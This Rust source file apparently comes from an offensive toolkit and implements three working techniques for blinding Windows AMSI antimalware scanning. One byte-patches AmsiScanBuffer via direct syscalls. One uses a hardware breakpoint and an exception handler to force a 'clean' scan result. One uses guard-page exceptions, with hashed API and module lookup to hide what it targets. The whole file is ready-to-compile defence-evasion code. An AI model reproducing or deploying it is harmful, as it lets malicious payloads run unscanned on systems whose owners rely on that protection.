// =======================================================================================================
// AMSI EVASION Techniques
// =======================================================================================================

#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionAMSIHwbp"))]
use windows_sys::Win32::Foundation::HANDLE;

#[cfg(feature = "EvasionAMSISimplePatch")]
use std::ffi::c_void;

#[cfg(feature = "EvasionAMSISimplePatch")]
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
#[cfg(feature = "EvasionAMSISimplePatch")]
use windows_sys::Win32::System::Threading::GetCurrentProcess;
#[cfg(feature = "EvasionAMSISimplePatch")]
use rust_syscalls::syscall;

#[cfg(feature = "EvasionAMSIHwbp")]
use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;

// =======================================================================================================
// AMSI EVASION: AmsiScanBuffer Patch
// =======================================================================================================

#[cfg(feature = "EvasionAMSISimplePatch")]
pub fn patch_amsi() -> Result<(), &'static str> {
    unsafe {
        // Load amsi.dll
        let amsi_dll = LoadLibraryA(b"amsi.dll\0".as_ptr());

        // Get AmsiScanBuffer address
        let amsi_scan_buffer = GetProcAddress(amsi_dll, b"AmsiScanBuffer\0".as_ptr());
        let amsi_scan_buffer_addr = amsi_scan_buffer.unwrap() as *mut c_void;

        // Calculate offset based on architecture
        #[cfg(target_arch = "x86")]
        let offset = 0x47;
        #[cfg(target_arch = "x86_64")]
        let offset = 0x6D;

        let patch_address = (amsi_scan_buffer_addr as usize + offset) as *mut c_void;

        // Patch byte: change JZ to JNZ (0x75)
        let patch: [u8; 1] = [0x75];

        // Change memory protection to RWX
        let mut old_protect: u32 = 0;
        let mut region_size: usize = patch.len();
        let mut base_address = patch_address;

        let status = syscall!(
            "NtProtectVirtualMemory",
            GetCurrentProcess() as HANDLE,
            &mut base_address as *mut *mut c_void,
            &mut region_size as *mut usize,
            0x40u32, // PAGE_EXECUTE_READWRITE
            &mut old_protect as *mut u32
        );

        // Write the patch
        let mut bytes_written: usize = 0;
        let status = syscall!(
            "NtWriteVirtualMemory",
            GetCurrentProcess() as HANDLE,
            patch_address,
            patch.as_ptr() as *const c_void,
            patch.len(),
            &mut bytes_written as *mut usize
        );

        // Restore original protection
        let mut temp_protect: u32 = 0;
        let mut region_size: usize = patch.len();
        let mut base_address = patch_address;

        let status = syscall!(
            "NtProtectVirtualMemory",
            GetCurrentProcess() as HANDLE,
            &mut base_address as *mut *mut c_void,
            &mut region_size as *mut usize,
            old_protect,
            &mut temp_protect as *mut u32
        );
        Ok(())
    }
}

// =======================================================================================================
// AMSI EVASION: Hardware Breakpoint Bypass
// =======================================================================================================

#[cfg(feature = "EvasionAMSIHwbp")]
use windows_sys::Win32::System::LibraryLoader::GetProcAddress;
#[cfg(feature = "EvasionAMSIHwbp")]
use windows_sys::Win32::System::Diagnostics::Debug::{CONTEXT, EXCEPTION_POINTERS, EXCEPTION_RECORD};
#[cfg(feature = "EvasionAMSIHwbp")]
use windows_sys::Win32::System::Threading::GetCurrentThread;

#[cfg(feature = "EvasionAMSIHwbp")]
const EXCEPTION_SINGLE_STEP: u32 = 0x80000004;
#[cfg(feature = "EvasionAMSIHwbp")]
const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
#[cfg(feature = "EvasionAMSIHwbp")]
const EXCEPTION_CONTINUE_SEARCH: i32 = 0;
#[cfg(feature = "EvasionAMSIHwbp")]
const CONTEXT_ALL: u32 = 0x10000B;

#[cfg(feature = "EvasionAMSIHwbp")]
static mut AMSI_SCAN_BUFFER_PTR: Option<*mut u8> = None;

#[cfg(feature = "EvasionAMSIHwbp")]
fn set_bits(dw: u64, low_bit: i32, bits: i32, new_value: u64) -> u64 {
    let mask = (1 << bits) - 1;
    (dw & !(mask << low_bit)) | (new_value << low_bit)
}

#[cfg(feature = "EvasionAMSIHwbp")]
fn clear_breakpoint(ctx: &mut CONTEXT, index: i32) {
    match index {
        0 => ctx.Dr0 = 0,
        1 => ctx.Dr1 = 0,
        2 => ctx.Dr2 = 0,
        3 => ctx.Dr3 = 0,
        _ => {}
    }
    ctx.Dr7 = set_bits(ctx.Dr7, index * 2, 1, 0);
    ctx.Dr6 = 0;
    ctx.EFlags = 0;
}

#[cfg(feature = "EvasionAMSIHwbp")]
fn enable_breakpoint(ctx: &mut CONTEXT, address: *mut u8, index: i32) {
    match index {
        0 => ctx.Dr0 = address as u64,
        1 => ctx.Dr1 = address as u64,
        2 => ctx.Dr2 = address as u64,
        3 => ctx.Dr3 = address as u64,
        _ => {}
    }
    ctx.Dr7 = set_bits(ctx.Dr7, 16, 16, 0);
    ctx.Dr7 = set_bits(ctx.Dr7, index * 2, 1, 1);
    ctx.Dr6 = 0;
}

#[cfg(feature = "EvasionAMSIHwbp")]
fn get_arg(ctx: &CONTEXT, index: i32) -> usize {
    match index {
        0 => ctx.Rcx as usize,
        1 => ctx.Rdx as usize,
        2 => ctx.R8 as usize,
        3 => ctx.R9 as usize,
        _ => unsafe { *((ctx.Rsp as *const u64).offset((index + 1) as isize) as *const usize) },
    }
}

#[cfg(feature = "EvasionAMSIHwbp")]
fn get_return_address(ctx: &CONTEXT) -> usize {
    unsafe { *(ctx.Rsp as *const usize) }
}

#[cfg(feature = "EvasionAMSIHwbp")]
fn set_result(ctx: &mut CONTEXT, result: usize) {
    ctx.Rax = result as u64;
}

#[cfg(feature = "EvasionAMSIHwbp")]
fn adjust_stack_pointer(ctx: &mut CONTEXT, amount: i32) {
    ctx.Rsp = (ctx.Rsp as i64 + amount as i64) as u64;
}

#[cfg(feature = "EvasionAMSIHwbp")]
fn set_ip(ctx: &mut CONTEXT, new_ip: usize) {
    ctx.Rip = new_ip as u64;
}

#[cfg(feature = "EvasionAMSIHwbp")]
unsafe extern "system" fn exception_handler(exceptions: *mut EXCEPTION_POINTERS) -> i32 {
    unsafe {
        let exception_record = &*(*exceptions).ExceptionRecord;
        let ctx = &mut *(*exceptions).ContextRecord;

        let ptr = std::ptr::addr_of!(AMSI_SCAN_BUFFER_PTR);
        if exception_record.ExceptionCode == EXCEPTION_SINGLE_STEP as i32
            && exception_record.ExceptionAddress == (*ptr).unwrap() as *mut std::ffi::c_void
        {
            let return_address = get_return_address(ctx);
            let scan_result_ptr = get_arg(ctx, 5) as *mut i32;
            *scan_result_ptr = 0; // AMSI_RESULT_CLEAN

            set_ip(ctx, return_address);
            adjust_stack_pointer(ctx, std::mem::size_of::<*mut u8>() as i32);
            set_result(ctx, 0); // S_OK
            clear_breakpoint(ctx, 0);

            EXCEPTION_CONTINUE_EXECUTION
        } else {
            EXCEPTION_CONTINUE_SEARCH
        }
    }
}

#[cfg(feature = "EvasionAMSIHwbp")]
type NtGetContextThreadFn = unsafe extern "system" fn(HANDLE, *mut CONTEXT) -> u32;
#[cfg(feature = "EvasionAMSIHwbp")]
type NtSetContextThreadFn = unsafe extern "system" fn(HANDLE, *mut CONTEXT) -> u32;
#[cfg(feature = "EvasionAMSIHwbp")]
type AddVectoredExceptionHandlerFn = unsafe extern "system" fn(u32, unsafe extern "system" fn(*mut EXCEPTION_POINTERS) -> i32) -> *mut std::ffi::c_void;

#[cfg(feature = "EvasionAMSIHwbp")]
pub fn patch_amsi_hwbp() -> Result<(), i32> {
    unsafe {
        let ptr = std::ptr::addr_of_mut!(AMSI_SCAN_BUFFER_PTR);
        if (*ptr).is_none() {
            let mut module_handle = GetModuleHandleA(b"amsi.dll\0".as_ptr()) as *mut std::ffi::c_void;
            if module_handle.is_null() {
                module_handle = windows_sys::Win32::System::LibraryLoader::LoadLibraryA(b"amsi.dll\0".as_ptr()) as *mut std::ffi::c_void;
            }
            
            if module_handle.is_null() {
                return Err(-1);
            }

            let amsi_scan_buffer = GetProcAddress(module_handle, b"AmsiScanBuffer\0".as_ptr());
            if amsi_scan_buffer.is_none() {
                return Err(-2);
            }
            *ptr = Some(amsi_scan_buffer.unwrap() as *mut u8);
        }

        // Get kernel32 for AddVectoredExceptionHandler
        let kernel32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr()) as *mut std::ffi::c_void;
        if kernel32.is_null() {
            return Err(-3);
        }

        let add_veh_addr = GetProcAddress(kernel32, b"AddVectoredExceptionHandler\0".as_ptr());
        if add_veh_addr.is_none() {
            return Err(-4);
        }
        let add_veh: AddVectoredExceptionHandlerFn = std::mem::transmute(add_veh_addr.unwrap());

        let h_ex_handler = add_veh(1, exception_handler);
        if h_ex_handler.is_null() {
            return Err(-5);
        }

        // Get ntdll for NtGetContextThread and NtSetContextThread
        let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr()) as *mut std::ffi::c_void;
        if ntdll.is_null() {
            return Err(-6);
        }

        let nt_get_ctx_addr = GetProcAddress(ntdll, b"NtGetContextThread\0".as_ptr());
        if nt_get_ctx_addr.is_none() {
            return Err(-7);
        }
        let nt_get_context: NtGetContextThreadFn = std::mem::transmute(nt_get_ctx_addr.unwrap());

        let nt_set_ctx_addr = GetProcAddress(ntdll, b"NtSetContextThread\0".as_ptr());
        if nt_set_ctx_addr.is_none() {
            return Err(-8);
        }
        let nt_set_context: NtSetContextThreadFn = std::mem::transmute(nt_set_ctx_addr.unwrap());

        let mut thread_ctx: CONTEXT = std::mem::zeroed();
        thread_ctx.ContextFlags = CONTEXT_ALL;
        
        let status = nt_get_context(GetCurrentThread(), &mut thread_ctx);
        if status != 0 {
            return Err(-(status as i32));
        }

        let ptr = std::ptr::addr_of!(AMSI_SCAN_BUFFER_PTR);
        enable_breakpoint(&mut thread_ctx, (*ptr).unwrap(), 0);

        let status = nt_set_context(GetCurrentThread(), &mut thread_ctx);
        if status != 0 {
            return Err(-(status as i32));
        }

        Ok(())
    }
}

// =======================================================================================================
// AMSI EVASION: Page Guard Exceptions
// =======================================================================================================

#[cfg(feature = "EvasionAMSIPageGuard")]
use std::ffi::{CStr, c_void};
#[cfg(feature = "EvasionAMSIPageGuard")]
use std::mem::{offset_of, size_of};
#[cfg(feature = "EvasionAMSIPageGuard")]
use std::ptr::null_mut;

#[cfg(feature = "EvasionAMSIPageGuard")]
use windows_sys::Win32::Foundation::{HANDLE, STATUS_GUARD_PAGE_VIOLATION, STATUS_SINGLE_STEP};
#[cfg(feature = "EvasionAMSIPageGuard")]
use windows_sys::Win32::System::Diagnostics::Debug::{
    EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH, EXCEPTION_POINTERS,
    IMAGE_NT_HEADERS64,
};
#[cfg(feature = "EvasionAMSIPageGuard")]
use windows_sys::Win32::System::Memory::{PAGE_EXECUTE_READ, PAGE_GUARD};
#[cfg(feature = "EvasionAMSIPageGuard")]
use windows_sys::Win32::System::SystemServices::{
    IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_SIGNATURE,
};
#[cfg(feature = "EvasionAMSIPageGuard")]
use windows_sys::Win32::System::Threading::PEB;
#[cfg(feature = "EvasionAMSIPageGuard")]
use windows_sys::Win32::System::WindowsProgramming::LDR_DATA_TABLE_ENTRY;

#[cfg(feature = "EvasionAMSIPageGuard")]
type AMSI_RESULT = u32;
#[cfg(feature = "EvasionAMSIPageGuard")]
const AMSI_RESULT_CLEAN: AMSI_RESULT = 0;

#[cfg(feature = "EvasionAMSIPageGuard")]
const fn c_hash(s: &str) -> u32 {
    let mut hash = 0x811c9dc5u32;
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        hash ^= bytes[i] as u32;
        hash = hash.wrapping_mul(0x01000193);
        i += 1;
    }
    hash
}

#[cfg(feature = "EvasionAMSIPageGuard")]
const fn w_hash(s: &[u16]) -> u32 {
    let mut hash = 0x811c9dc5u32;
    let mut i = 0;
    while i < s.len() {
        hash ^= s[i] as u32;
        hash = hash.wrapping_mul(0x01000193);
        i += 1;
    }
    hash
}

#[cfg(feature = "EvasionAMSIPageGuard")]
const AMSI_DLL_HASH: u32 = w_hash(&[
    'a' as u16, 'm' as u16, 's' as u16, 'i' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16,
]);

#[cfg(feature = "EvasionAMSIPageGuard")]
const AMSI_SCAN_BUFFER_HASH: u32 = c_hash("AmsiScanBuffer");

#[cfg(feature = "EvasionAMSIPageGuard")]
type PVECTORED_EXCEPTION_HANDLER = extern "system" fn(*mut EXCEPTION_POINTERS) -> i32;

#[cfg(feature = "EvasionAMSIPageGuard")]
#[link(name = "ntdll")]
unsafe extern "system" {
    fn RtlAddVectoredExceptionHandler(First: u32, Handler: PVECTORED_EXCEPTION_HANDLER) -> *mut c_void;
    fn RtlRemoveVectoredExceptionHandler(Handle: *mut c_void) -> u32;
    fn NtProtectVirtualMemory(
        ProcessHandle: HANDLE,
        BaseAddress: *mut *mut c_void,
        NumberOfBytesToProtect: *mut usize,
        NewAccessProtection: u32,
        OldAccessProtection: *mut u32,
    ) -> i32;
}

#[cfg(feature = "EvasionAMSIPageGuard")]
#[allow(unused_assignments)]
fn get_peb() -> *mut PEB {
    unsafe {
        let mut peb = null_mut::<PEB>();
        core::arch::asm!(
            "mov {0}, gs:[0x60]",
            out(reg) peb,
        );
        peb
    }
}

#[cfg(feature = "EvasionAMSIPageGuard")]
fn find_module(module_hash: u32) -> Option<u64> {
    unsafe {
        let peb = get_peb();
        if peb.is_null() {
            return None;
        }
        let ldr = (*peb).Ldr;
        if ldr.is_null() {
            return None;
        }
        let list_head = &(*ldr).InMemoryOrderModuleList as *const _ as usize;
        let mut link = (*ldr).InMemoryOrderModuleList.Flink;
        while (link as usize) != list_head {
            let entry = (link as usize - offset_of!(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks))
                as *mut LDR_DATA_TABLE_ENTRY;
            if entry.is_null() {
                break;
            }
            let dll_base = (*entry).DllBase as u64;
            let name = (*entry).FullDllName;
            let name_len = name.Length as usize / 2;
            let name_slice = if !name.Buffer.is_null() && name_len > 0 {
                std::slice::from_raw_parts(name.Buffer, name_len)
            } else {
                &[]
            };
            let name_hash = w_hash(name_slice);
            if name_hash == module_hash {
                return Some(dll_base);
            }
            link = (*link).Flink;
        }
        None
    }
}

#[cfg(feature = "EvasionAMSIPageGuard")]
fn find_api(module_base: u64, api_hash: u32) -> Option<u64> {
    let base_ptr = module_base as *mut u8;
    
    unsafe {
        let dos_header = &*(base_ptr as *const IMAGE_DOS_HEADER);
        if dos_header.e_magic != IMAGE_DOS_SIGNATURE {
            return None;
        }
        
        let nt_offset = dos_header.e_lfanew as usize;
        let nt_headers = &*((base_ptr.add(nt_offset)) as *const IMAGE_NT_HEADERS64);
        
        if nt_headers.Signature != IMAGE_NT_SIGNATURE {
            return None;
        }
        
        let export_rva = nt_headers.OptionalHeader.DataDirectory[0].VirtualAddress;
        if export_rva == 0 {
            return None;
        }

        let export_dir = &*((base_ptr.add(export_rva as usize)) as *const IMAGE_EXPORT_DIRECTORY);
        let names = base_ptr.add(export_dir.AddressOfNames as usize) as *const u32;
        let functions = base_ptr.add(export_dir.AddressOfFunctions as usize) as *const u32;
        let ordinals = base_ptr.add(export_dir.AddressOfNameOrdinals as usize) as *const u16;

        for i in 0..export_dir.NumberOfNames as usize {
            let name_rva = *names.add(i);
            let name_ptr = base_ptr.add(name_rva as usize) as *const i8;
            let cstr = CStr::from_ptr(name_ptr);
            if let Ok(name_str) = cstr.to_str() {
                let name_hash = c_hash(name_str);
                if name_hash == api_hash {
                    let ordinal = *ordinals.add(i) as usize;
                    let func_rva = *functions.add(ordinal) as u64;
                    let api_addr = module_base + func_rva;
                    return Some(api_addr);
                }
            }
        }
    }
    None
}

#[cfg(feature = "EvasionAMSIPageGuard")]
extern "system" fn vectored_exception_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    unsafe {
        let exception_record = (*exception_info).ExceptionRecord;
        let ex_code = (*exception_record).ExceptionCode;
        let ex_addr = (*exception_record).ExceptionAddress as u64;

        if ex_code == STATUS_GUARD_PAGE_VIOLATION {
            let amsi_base = find_module(AMSI_DLL_HASH).unwrap_or(0);
            if amsi_base == 0 {
                return EXCEPTION_CONTINUE_SEARCH;
            }
            let p_amsi_scan_buffer = find_api(amsi_base, AMSI_SCAN_BUFFER_HASH).unwrap_or(0);
            if p_amsi_scan_buffer == 0 {
                return EXCEPTION_CONTINUE_SEARCH;
            }

            let ctx = (*exception_info).ContextRecord;

            if ex_addr == p_amsi_scan_buffer {
                let stack = (*ctx).Rsp as *mut *mut c_void;
                let p_amsi_result = stack.add(6) as *mut AMSI_RESULT;
                *p_amsi_result = AMSI_RESULT_CLEAN;
                let ret_address = *stack;
                (*ctx).Rsp += size_of::<*mut c_void>() as u64;
                (*ctx).Rip = ret_address as u64;
                (*ctx).Rax = 0; // S_OK
                (*ctx).EFlags |= 0x100; // Trap flag
                return EXCEPTION_CONTINUE_EXECUTION;
            }
            (*ctx).EFlags |= 0x100;
            return EXCEPTION_CONTINUE_EXECUTION;
        }

        if ex_code == STATUS_SINGLE_STEP {
            let amsi_base = find_module(AMSI_DLL_HASH).unwrap_or(0);
            if amsi_base != 0 {
                let p_amsi_scan_buffer_addr =
                    find_api(amsi_base, AMSI_SCAN_BUFFER_HASH).unwrap_or(0);
                if p_amsi_scan_buffer_addr != 0 {
                    let mut p_amsi_scan_buffer = p_amsi_scan_buffer_addr as *mut c_void;
                    let mut region_size: usize = 1;
                    let mut old_protect: u32 = 0;
                    let status = NtProtectVirtualMemory(
                        -1isize as HANDLE,
                        &mut p_amsi_scan_buffer,
                        &mut region_size,
                        PAGE_EXECUTE_READ | PAGE_GUARD,
                        &mut old_protect,
                    );
                    if status >= 0 {
                        // Success
                    }
                }
            }
            return EXCEPTION_CONTINUE_EXECUTION;
        }
        EXCEPTION_CONTINUE_SEARCH
    }
}

#[cfg(feature = "EvasionAMSIPageGuard")]
pub fn patch_amsi_page_guard() -> Result<(), &'static str> {
    unsafe {
        // Find amsi.dll
        let amsi_base = find_module(AMSI_DLL_HASH).ok_or("")?;
        
        // Find AmsiScanBuffer
        let p_amsi_scan_buffer = find_api(amsi_base, AMSI_SCAN_BUFFER_HASH)
            .ok_or("")?;

        // Add vectored exception handler
        let h_vectored_exception_handler = RtlAddVectoredExceptionHandler(1, vectored_exception_handler);
        if h_vectored_exception_handler.is_null() {
            return Err("");
        }

        // Apply page guard
        let mut p_func = p_amsi_scan_buffer as *mut c_void;
        let mut number_of_bytes_to_protect: usize = 1;
        let mut old_protect: u32 = 0;
        let status = NtProtectVirtualMemory(
            -1isize as HANDLE,
            &mut p_func,
            &mut number_of_bytes_to_protect,
            PAGE_EXECUTE_READ | PAGE_GUARD,
            &mut old_protect,
        );
        
        if status < 0 {
            RtlRemoveVectoredExceptionHandler(h_vectored_exception_handler);
            return Err("");
        }

        Ok(())
    }
}
